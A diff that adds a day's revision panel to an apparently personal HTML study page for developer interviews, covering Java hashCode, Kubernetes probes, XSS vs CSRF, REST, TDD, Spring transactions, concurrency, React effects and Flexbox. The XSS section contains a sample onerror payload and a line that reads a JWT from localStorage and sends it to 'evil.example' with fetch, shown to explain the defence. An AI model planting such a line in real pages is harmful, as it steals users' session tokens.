@@ -68,11 +68,237 @@
 </header>
 
 <div class="tabs" role="tablist">
-  <button role="tab" id="t-review" aria-controls="review" aria-selected="true">Today&rsquo;s review</button>
+  <button role="tab" id="t-nov19" aria-controls="nov19" aria-selected="true">Thu 19 Nov</button>
+  <button role="tab" id="t-review" aria-controls="review" aria-selected="false">Wed 18 Nov</button>
   <button role="tab" id="t-hood" aria-controls="hood" aria-selected="false">Under the hood</button>
 </div>
 
-<div class="panel" id="review" role="tabpanel" aria-labelledby="t-review">
+<div class="panel" id="nov19" role="tabpanel" aria-labelledby="t-nov19">
+<p class="note">Thursday, 19 November. Weakest topics first.</p>
+
+<p class="rule">Habit: read the whole problem twice before answering. Count every hook, every condition and every sub-question.</p>
+
+<nav>
+  <a href="#d19-hash">hashCode</a><a href="#d19-probes">Probes</a><a href="#d19-xss">XSS vs CSRF</a>
+  <a href="#d19-rest">REST</a><a href="#d19-tdd">TDD</a><a href="#d19-tx">Transactions</a>
+  <a href="#d19-race">Races</a><a href="#d19-react">React effects</a><a href="#d19-flex">Flexbox</a>
+</nav>
+
+<section id="d19-hash">
+  <h2>equals without hashCode</h2>
+  <p class="rule"><code>hashCode</code> is the gate. A different hash means a different bucket, and <code>equals</code> is never called.</p>
+  <pre><code>class Claim {            // equals by id, NO hashCode override
+  ...
+}
+set.add(new Claim("7"));
+set.add(new Claim("7"));
+set.size();                       // 2  (duplicate in a Set)
+set.contains(new Claim("7"));     // false</code></pre>
+  <p><code>Object.hashCode</code> is <b>identity-based</b>: two separate objects get different values, whatever their fields.</p>
+  <h3>Steps in order: HashSet.add(e)</h3>
+  <ol>
+    <li>Call <code>e.hashCode()</code>.</li>
+    <li>Pick the bucket from that hash.</li>
+    <li>Bucket empty → store, return <code>true</code>. <code>equals</code> is <b>not</b> called.</li>
+    <li>Otherwise, for each entry: stored hash equal? Only then call <code>equals</code>.</li>
+    <li>A match → don't store; no match → store.</li>
+  </ol>
+  <p><b>Contract:</b> if <code>a.equals(b)</code>, then <code>a.hashCode() == b.hashCode()</code>. Override both or neither. Fix: <code>return Objects.hash(id);</code> or use a <code>record</code>. <code>HashSet</code> is backed by a <code>HashMap</code>.</p>
+  <p>Related trap: mutate a key's fields after <code>put</code> and <code>get</code> looks in the wrong bucket, so the entry becomes <b>unreachable</b>. Keys should be immutable.</p>
+  <div class="kw"><span>HashSet backed by HashMap</span><span>hashCode first, then equals</span><span>Object.hashCode identity-based</span><span>equal objects → equal hash codes</span><span>different buckets</span><span>equals never called</span><span>Objects.hash(id)</span><span>record</span><span>immutable keys</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Object.html#hashCode()" target="_blank" rel="noopener">Javadoc: Object.hashCode</a> · the contract in three bullet points</li></ul>
+</section>
+
+<section id="d19-probes">
+  <h2>OpenShift / Kubernetes probes</h2>
+  <p class="rule">Readiness controls traffic. Liveness controls restarts. Startup holds both off. Nothing rolls back by itself.</p>
+  <div class="table"><table>
+    <tr><th>Probe</th><th>Question</th><th>On failure</th></tr>
+    <tr><td>Readiness</td><td>Can it take traffic now?</td><td>Kept out of the <b>Service endpoints</b>, not restarted</td></tr>
+    <tr><td>Liveness</td><td>Is it still alive?</td><td>Container killed and restarted</td></tr>
+    <tr><td>Startup</td><td>Has it finished starting?</td><td>Liveness and readiness don't run until it passes</td></tr>
+  </table></div>
+  <ul>
+    <li>New version never ready → old pods keep serving, rollout stalls, marked failed after <code>progressDeadlineSeconds</code>, someone runs <code>oc rollout undo</code>.</li>
+    <li>Deadlock or infinite loop → liveness fails → restart.</li>
+  </ul>
+  <h3>Steps in order: slow start, no startup probe</h3>
+  <ol>
+    <li>Container starts a 2-minute warm-up.</li>
+    <li>Liveness checks at 10, 20, 30 s: all fail.</li>
+    <li>Third miss (<code>failureThreshold</code>) → kubelet kills the container.</li>
+    <li>Restart → back to step 1, forever.</li>
+    <li>Status <b><code>CrashLoopBackOff</code></b>. Fix: a startup probe with enough budget (<code>periodSeconds: 10</code>, <code>failureThreshold: 15</code>).</li>
+  </ol>
+  <div class="kw"><span>readiness = traffic</span><span>Service endpoints</span><span>liveness = restart</span><span>startup probe holds off liveness</span><span>no automatic rollback</span><span>progressDeadlineSeconds</span><span>oc rollout undo</span><span>CrashLoopBackOff</span><span>failureThreshold</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/" target="_blank" rel="noopener">Kubernetes: Liveness, Readiness and Startup Probes</a> · the startup probe example matches this case</li></ul>
+</section>
+
+<section id="d19-xss">
+  <h2>XSS vs CSRF</h2>
+  <p class="rule">Both run in the victim's browser. XSS runs on <b>your</b> page and can read storage. CSRF runs on <b>another</b> site and rides the cookie the browser attaches automatically.</p>
+  <div class="table"><table>
+    <tr><th></th><th>CSRF</th><th>Stored XSS</th></tr>
+    <tr><td>Code runs</td><td>On another site's page</td><td>On your page (saved note with <code>onerror</code>)</td></tr>
+    <tr><td>Mechanism</td><td>Browser <b>attaches the cookie automatically</b> to the cross-site request</td><td><code>localStorage.getItem("jwt")</code>, then <b>exfiltrate</b> with <code>fetch</code></td></tr>
+    <tr><td>Defence</td><td><code>SameSite=Lax</code>/<code>Strict</code> + CSRF token</td><td><b>Output encoding</b> + <b>CSP</b>; move the token to an <code>HttpOnly</code> cookie</td></tr>
+  </table></div>
+  <ul>
+    <li><code>HttpOnly</code> is a <b>cookie attribute</b> in the <code>Set-Cookie</code> response header. It hides that cookie from <code>document.cookie</code>. It does nothing for <code>localStorage</code>.</li>
+    <li>Neither <code>HttpOnly</code> nor <code>SameSite</code> stops a script from running. Only output encoding does: React escapes <code>{note}</code>, so never use <code>dangerouslySetInnerHTML</code>.</li>
+  </ul>
+  <h3>Steps in order: stored XSS</h3>
+  <ol>
+    <li>Attacker saves <code>&lt;img src=x onerror="..."&gt;</code>.</li>
+    <li>Another user opens the page; the note is rendered as HTML.</li>
+    <li><code>src=x</code> fails, <code>onerror</code> fires on your origin.</li>
+    <li><code>localStorage.getItem("jwt")</code> → <code>fetch("https://evil.example/?t=" + jwt)</code>.</li>
+    <li>With output encoding, step 2 shows plain text and nothing runs.</li>
+  </ol>
+  <div class="kw"><span>CSRF</span><span>stored XSS</span><span>your site vs another site</span><span>cookie attached automatically</span><span>SameSite=Lax</span><span>CSRF token</span><span>localStorage.getItem</span><span>exfiltration</span><span>output encoding</span><span>CSP</span><span>HttpOnly</span><span>Set-Cookie</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a> · output encoding first</li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP: CSRF Prevention Cheat Sheet</a></li></ul>
+</section>
+
+<section id="d19-rest">
+  <h2>REST: idempotency and status codes</h2>
+  <p class="rule"><code>GET</code>, <code>PUT</code>, <code>DELETE</code> are idempotent. <code>POST</code> isn't, because the server picks the new id. That's why <code>POST</code> needs an <code>Idempotency-Key</code>.</p>
+  <ul>
+    <li><code>PUT /claims/555</code>: the <b>client names the URL</b> and sends the <b>whole resource</b>. A partial change is <code>PATCH</code>.</li>
+    <li><code>DELETE</code> twice: the second call may return 404, but the state is the same, and that's what idempotent means.</li>
+  </ul>
+  <h3>Steps in order: Idempotency-Key</h3>
+  <ol>
+    <li>User taps Submit → app generates a UUID <b>once</b>.</li>
+    <li>First request: no record → create → store <b>key + request fingerprint + response</b>.</li>
+    <li>Retry, same key, same body → create nothing, <b>replay the stored response</b> (<code>201</code>, <code>Location: /refunds/901</code>).</li>
+    <li>Same key, <b>different body</b> → <code>422 Unprocessable Content</code>. Still in progress → <code>409 Conflict</code>.</li>
+  </ol>
+  <div class="table"><table>
+    <tr><th>Code</th><th>Meaning</th></tr>
+    <tr><td>200 / 201 / 204</td><td>OK / Created + <code>Location</code> / No Content</td></tr>
+    <tr><td>400</td><td>Malformed request</td></tr>
+    <tr><td>401</td><td>Not <b>authenticated</b> ("who are you?")</td></tr>
+    <tr><td>403</td><td>Authenticated but not <b>authorized</b> ("I know you, and no")</td></tr>
+    <tr><td>404</td><td>Not found</td></tr>
+    <tr><td>409</td><td>Conflicts with current state</td></tr>
+    <tr><td>412</td><td><code>If-Match</code> ETag mismatch</td></tr>
+    <tr><td>422</td><td>Syntax fine, meaning invalid</td></tr>
+    <tr><td>429</td><td>Rate limited, send <code>Retry-After</code></td></tr>
+    <tr><td>500 / 503</td><td>Server bug / unavailable, retry may work</td></tr>
+  </table></div>
+  <div class="kw"><span>idempotent methods</span><span>POST not idempotent</span><span>PUT = whole resource</span><span>PATCH = partial</span><span>client picks the URL</span><span>Idempotency-Key</span><span>generated once per action</span><span>request fingerprint</span><span>replay the stored response</span><span>201 + Location</span><span>422 Unprocessable Content</span><span>409 Conflict</span><span>401 vs 403</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status" target="_blank" rel="noopener">MDN: HTTP response status codes</a></li><li><a href="https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/" target="_blank" rel="noopener">IETF draft: Idempotency-Key header</a> · the 422 and 409 cases</li></ul>
+</section>
+
+<section id="d19-tdd">
+  <h2>TDD: boundaries and partitions</h2>
+  <p class="rule">Read the rule's wording before asking. Then test each edge, one value from inside each range, and invalid input.</p>
+  <p>Rule: under 18 → child, 65 and over → senior, else standard. "Under" and "and over" already settle the edges.</p>
+  <ul>
+    <li><b>Clarify:</b> is the input an age or a date of birth? Age as of which date, in which time zone? What about invalid input?</li>
+    <li><b>Boundary values:</b> 17, 18, 64, 65.</li>
+    <li><b>Equivalence partitioning</b> (one per range): 5, 40, 80.</li>
+    <li><b>Invalid:</b> -1, <code>null</code> → rejected.</li>
+    <li>No tricks: modulo is for cycles, not ranges. A plain ordered <code>if</code> chain is the answer.</li>
+  </ul>
+  <h3>Steps in order: one TDD cycle</h3>
+  <ol>
+    <li>Ask the clarifying questions.</li>
+    <li><b>Red:</b> one failing test, run it, see it fail.</li>
+    <li><b>Green:</b> the minimum code to pass.</li>
+    <li><b>Refactor</b> with tests green.</li>
+    <li>Typed code before a test? The navigator says so; delete it and go back to red.</li>
+  </ol>
+  <div class="kw"><span>clarifying question</span><span>age vs date of birth</span><span>time zone</span><span>boundary values</span><span>equivalence partitioning</span><span>invalid input</span><span>red-green-refactor</span><span>navigator = big picture</span><span>driver = tactics</span><span>back to red</span></div>
+</section>
+
+<section id="d19-tx">
+  <h2>@Transactional: proxy and rollback rules</h2>
+  <p class="rule">Default rollback only on <code>RuntimeException</code> and <code>Error</code>. A checked exception <b>commits</b>.</p>
+  <ul>
+    <li>Call through the injected bean → goes through the <b>proxy</b> → transaction. Call via <code>this</code> → <b>self-invocation</b> → no transaction.</li>
+    <li>Fix for a checked exception: <code>@Transactional(rollbackFor = AuditException.class)</code>. Moving the annotation doesn't change the rule. Opposite: <code>noRollbackFor</code>.</li>
+    <li>Self-invocation fixes: annotate the outer method (all or nothing) or move the method to another bean (one transaction per item).</li>
+  </ul>
+  <h3>Steps in order: checked exception</h3>
+  <ol>
+    <li>Controller → proxy: transaction begins.</li>
+    <li><code>markApproved(7)</code> runs inside it.</li>
+    <li><code>log(7)</code> throws a checked exception.</li>
+    <li>Proxy checks the rule: checked and not in <code>rollbackFor</code> → <b>commit</b>.</li>
+    <li>Exception rethrown; claim 7 is approved anyway.</li>
+  </ol>
+  <div class="kw"><span>proxy</span><span>injected bean</span><span>self-invocation</span><span>RuntimeException and Error roll back</span><span>checked exception commits</span><span>rollbackFor</span><span>noRollbackFor</span><span>all-or-nothing vs per-item</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://docs.spring.io/spring-framework/reference/data-access/transaction/declarative/rolling-back.html" target="_blank" rel="noopener">Spring docs: Rolling back a declarative transaction</a> · the checked-exception rule</li></ul>
+</section>
+
+<section id="d19-race">
+  <h2>Races on a ConcurrentHashMap</h2>
+  <p class="rule">Each call is atomic; the sequence isn't. <code>get</code> then <code>put</code> is a <b>read-modify-write</b> and loses updates.</p>
+  <h3>Steps in order: lost update</h3>
+  <ol>
+    <li>Thread A: <code>get("M1")</code> → <code>null</code>.</li>
+    <li>Thread B: <code>get("M1")</code> → <code>null</code>.</li>
+    <li>Thread A: <code>put("M1", 1)</code>.</li>
+    <li>Thread B: <code>put("M1", 1)</code>, overwriting A.</li>
+    <li>Count is 1, not 2.</li>
+  </ol>
+  <pre><code>claimCounts.merge(memberId, 1, Integer::sum);   // one atomic step</code></pre>
+  <p>Also: <code>compute</code>, a <code>synchronized</code> method, or <code>LongAdder</code>/<code>AtomicInteger</code> values with <code>computeIfAbsent(...).increment()</code>. For a single counter: <code>AtomicInteger.incrementAndGet()</code>. <code>volatile</code> = visibility, never atomicity.</p>
+  <div class="kw"><span>each call atomic, sequence not</span><span>read-modify-write</span><span>check-then-act</span><span>lost update</span><span>merge</span><span>compute</span><span>synchronized</span><span>LongAdder</span><span>AtomicInteger</span><span>incrementAndGet</span><span>volatile = visibility</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/util/concurrent/ConcurrentHashMap.html" target="_blank" rel="noopener">Javadoc: ConcurrentHashMap</a> · merge and compute are atomic</li></ul>
+</section>
+
+<section id="d19-react">
+  <h2>React: when effects run</h2>
+  <p class="rule">Scan the whole component for every hook first. The dependency array is a filter, not a trigger.</p>
+  <div class="table"><table>
+    <tr><th>Moment</th><th>Deps compared</th><th>Logged</th></tr>
+    <tr><td>Mount</td><td>first render, both effects in order</td><td><code>open 7</code>, <code>once</code></td></tr>
+    <tr><td>Re-render, still 7</td><td><code>[7]</code> vs <code>[7]</code>; <code>[]</code> vs <code>[]</code>: same</td><td>nothing (skipped)</td></tr>
+    <tr><td>7 → 8</td><td><code>[7]</code> vs <code>[8]</code>: changed</td><td><code>close 7</code>, then <code>open 8</code></td></tr>
+    <tr><td>Unmount</td><td>-</td><td><code>close 8</code> (the <code>[]</code> effect has no cleanup)</td></tr>
+  </table></div>
+  <h3>Steps in order: deps change</h3>
+  <ol>
+    <li>New props → re-render → commit → paint.</li>
+    <li>Compare each dependency with the previous render (<code>Object.is</code>).</li>
+    <li>Changed → run the <b>previous</b> effect's cleanup (a closure with the old value).</li>
+    <li>Then run the new effect.</li>
+  </ol>
+  <div class="kw"><span>dependency array comparison</span><span>Object.is</span><span>skipped effect</span><span>empty array = mount only</span><span>cleanup of the previous effect</span><span>before the next effect</span><span>unmount</span><span>closure</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://react.dev/learn/lifecycle-of-reactive-effects" target="_blank" rel="noopener">react.dev: Lifecycle of Reactive Effects</a></li></ul>
+</section>
+
+<section id="d19-flex">
+  <h2>Flexbox: main and cross axis</h2>
+  <p class="rule">Say "main axis" and "cross axis", then name the direction. Horizontal or vertical depends on <code>flex-direction</code>.</p>
+  <pre><code>.bar {
+  display: flex;                    /* flex container; children = flex items */
+  justify-content: space-between;   /* main axis: first at start, last at end */
+  align-items: center;              /* cross axis: centred */
+}</code></pre>
+  <div class="table"><table>
+    <tr><th><code>flex-direction</code></th><th>Main axis (<code>justify-content</code>)</th><th>Cross axis (<code>align-items</code>)</th></tr>
+    <tr><td><code>row</code> (default)</td><td>horizontal</td><td>vertical</td></tr>
+    <tr><td><code>column</code></td><td>vertical</td><td>horizontal</td></tr>
+  </table></div>
+  <p>Values say <code>flex-start</code> / <code>flex-end</code>, never top or bottom. <code>align-content</code> only acts on wrapped lines.</p>
+  <div class="kw"><span>flex container</span><span>flex items</span><span>flex-direction: row default</span><span>main axis</span><span>cross axis</span><span>justify-content: space-between</span><span>align-items: center</span><span>flex-end, not bottom</span><span>align-items, not align-content</span></div>
+  <h3>Go deeper</h3>
+  <ul class="more"><li><a href="https://flexboxfroggy.com/" target="_blank" rel="noopener">Flexbox Froggy</a> · drills justify-content vs align-items</li></ul>
+</section>
+
+</div>
+
+<div class="panel" id="review" role="tabpanel" aria-labelledby="t-review" hidden>
 <p class="note">Wednesday, 18 November.</p>
 
 <nav>
